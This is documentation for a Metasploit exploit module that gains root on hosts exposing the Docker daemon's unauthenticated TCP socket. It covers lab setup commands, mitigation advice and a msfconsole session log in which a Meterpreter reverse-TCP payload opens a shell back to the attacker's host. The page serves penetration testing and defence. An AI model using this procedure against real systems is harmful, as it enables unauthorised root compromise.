{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/docker_daemon_tcp","result":{"data":{"moduleMetadataJson":{"id":"5ab5c83e-8950-515d-8c19-b2358e393279","name":"Docker Daemon - Unprotected TCP Socket Exploit","fullname":"exploit/linux/http/docker_daemon_tcp","description":"Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp\n        with tls but without tls-auth), an attacker can create a Docker\n        container with the '/' path mounted with read/write permissions on the\n        host server that is running the Docker container. As the Docker\n        container executes command as uid 0 it is honored by the host operating\n        system allowing the attacker to edit/create files owned by root. This\n        exploit abuses this to creates a cron job in the '/etc/cron.d/' path of\n        the host server.\n\n        The Docker image should exist on the target system or be a valid image\n        from hub.docker.com.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/docker_daemon_tcp","documentationSlug":"/modules/documentation/exploit/linux/http/docker_daemon_tcp"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp\nwith tls but without tls-auth), an attacker can create a Docker\ncontainer with the '/' path mounted with read/write permissions on the\nhost server that is running the Docker container. As the Docker\ncontainer executes command as uid 0 it is honored by the host operating\nsystem allowing the attacker to edit/create files owned by root. This\nexploit abuses this to creates a cron job in the '/etc/cron.d/' path of\nthe host server.</p>\n<p>The Docker image should exist on the target system or be a valid image\nfrom hub.docker.com.</p>\n<h2 id=\"docker-engine\" style=\"position:relative;\"><a href=\"#docker-engine\" aria-label=\"docker engine permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Docker Engine</h2>\n<p>By default, Docker runs via a non-networked unix socket. It can also\noptionally communicate using a tcp socket.</p>\n<blockquote>\n<p>Warning: Changing the default docker daemon binding to a TCP port or\nUnix docker user group will increase your security risks by allowing\nnon-root users to gain root access on the host. Make sure you control\naccess to docker. If you are binding to a TCP port, anyone with access\nto that port has full Docker access; so it is not advisable on an open\nnetwork. -- <a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#bind-docker-to-another-hostport-or-a-unix-socket\">from docs.docker.com</a></p>\n</blockquote>\n<p>This module was tested with Debian 9 and CentOS 7 as the host operating\nsystem and with Docker CE 17.06.0-ce and Docker Engine 1.13.1.</p>\n<h3 id=\"install-debian-9\" style=\"position:relative;\"><a href=\"#install-debian-9\" aria-label=\"install debian 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install Debian 9</h3>\n<p>First <a href=\"https://www.debian.org/releases/stretch/amd64/index.html.en\">install Debian 9</a> with default task selection. This includes\nthe \"<em>standard system utilities</em>\".</p>\n<h3 id=\"install-docker\" style=\"position:relative;\"><a href=\"#install-docker\" aria-label=\"install docker permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install Docker</h3>\n<p>Then install a supported version of <a href=\"https://docs.docker.com/engine/installation/linux/docker-ce/debian/\">Docker on Debian system</a>.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token comment\"># TL;DR</span>\n<span class=\"token function\">apt-get</span> remove docker docker-engine\n<span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> apt-transport-https ca-certificates <span class=\"token function\">curl</span> gnupg2 software-properties-common\n<span class=\"token function\">curl</span> -fsSL https://download.docker.com/linux/debian/gpg <span class=\"token operator\">|</span> apt-key <span class=\"token function\">add</span> -\napt-key fingerprint 0EBFCD88\n<span class=\"token comment\"># Verify that the key ID is 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88.</span>\nadd-apt-repository <span class=\"token string\">\"deb [arch=amd64] https://download.docker.com/linux/debian <span class=\"token variable\"><span class=\"token variable\">$(</span>lsb_release -cs<span class=\"token variable\">)</span></span> stable\"</span>\n<span class=\"token function\">apt-get</span> update\n<span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> docker-ce\ndocker run hello-world</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"activate-unprotected-tcp-socket\" style=\"position:relative;\"><a href=\"#activate-unprotected-tcp-socket\" aria-label=\"activate unprotected tcp socket permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Activate unprotected tcp socket</h3>\n<p>Once Docker is installed, customize the Docker daemon options and add\nthe tcp socket <code class=\"language-text\">-H tcp://0.0.0.0:2375</code> option. On Debian override the\nsettings from <code class=\"language-text\">/lib/systemd/system/docker.service</code> with a new file\n<code class=\"language-text\">/etc/systemd/system/docker.service</code>.</p>\n<p>Further information: <a href=\"https://docs.docker.com/engine/admin/systemd/\">docker systemd</a> and <a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#options\">docker daemon options</a>. </p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token comment\"># TL;DR</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"[Service]\nExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> /etc/systemd/system/docker.service\nsystemctl daemon-reload\nsystemctl restart docker\n<span class=\"token function\">curl</span> http://127.0.0.1:2375/_ping <span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span>\nOK</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"mitigation\" style=\"position:relative;\"><a href=\"#mitigation\" aria-label=\"mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p><a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/#options\">Disable</a> or <a href=\"https://docs.docker.com/engine/security/https/\">protect</a> the Docker tcp socket.</p>\n<p><a href=\"https://docs.docker.com/engine/security/userns-remap/#disable-namespace-remapping-for-a-container\">User namespaces</a> did <strong>not</strong> protect against this.</p>\n<h1 id=\"exploitation\" style=\"position:relative;\"><a href=\"#exploitation\" aria-label=\"exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploitation</h1>\n<p>This module is designed for the attacker to leverage, creation of a\nDocker container with out authentication through the Docker tcp socket\nto gain root access to the hosting server of the Docker container.</p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<ul>\n<li>DOCKERIMAGE is the locally or from hub.docker.com available image you are wanting to have Docker to deploy for this exploit.</li>\n<li>CONTAINER_ID if you want to have a human readable name for your container, else it will be randomly generated</li>\n</ul>\n<h2 id=\"steps-to-exploit-with-module\" style=\"position:relative;\"><a href=\"#steps-to-exploit-with-module\" aria-label=\"steps to exploit with module permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Steps to exploit with module</h2>\n<ul>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Start msfconsole</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> use exploit/linux/http/docker<em>daemon</em>tcp</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Set the options appropriately and set VERBOSE to true</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> Verify it creates a Docker container and it successfully runs</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" disabled> After a minute a session should be opened from the Docker server</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/docker_daemon_tcp\nmsf exploit(docker_daemon_tcp) &gt; set RHOST 192.168.66.23\nRHOST =&gt; 192.168.66.23\nmsf exploit(docker_daemon_tcp) &gt; set PAYLOAD linux/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; linux/x64/meterpreter/reverse_tcp\nmsf exploit(docker_daemon_tcp) &gt; set LHOST 192.168.66.10\nLHOST =&gt; 192.168.66.10\nmsf exploit(docker_daemon_tcp) &gt; set VERBOSE true\nVERBOSE =&gt; true\nmsf exploit(docker_daemon_tcp) &gt; check\n[+] 192.168.66.23:2375 The target is vulnerable.\nmsf exploit(docker_daemon_tcp) &gt; run\n\n[*] Started reverse TCP handler on 192.168.66.10:4444\n[*] Check if images exist on the target host\n[*] Image is not available on the target host\n[*] Trying to pulling image from docker registry, this may take a while\n[*] Setting container json request variables\n[*] Creating the docker container command\n[*] The docker container is created, waiting for deploy\n[*] Waiting for the cron job to run, can take up to 60 seconds\n[*] Waiting until the docker container stopped\n[*] The docker container has been stopped, now trying to remove it\n[*] Sending stage (2878936 bytes) to 192.168.66.23\n[*] Meterpreter session 1 opened (192.168.66.10:4444 -&gt; 192.168.66.23:35050) at 2017-07-25 14:03:02 +0200\n[+] Deleted /etc/cron.d/lVoepNpy\n[+] Deleted /tmp/poasDIuZ\n\n\nmeterpreter &gt; sysinfo\nComputer     : rancher\nOS           : Debian 9.1 (Linux 4.9.0-3-amd64)\nArchitecture : x64\nMeterpreter  : x64/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"5ab5c83e-8950-515d-8c19-b2358e393279"}}}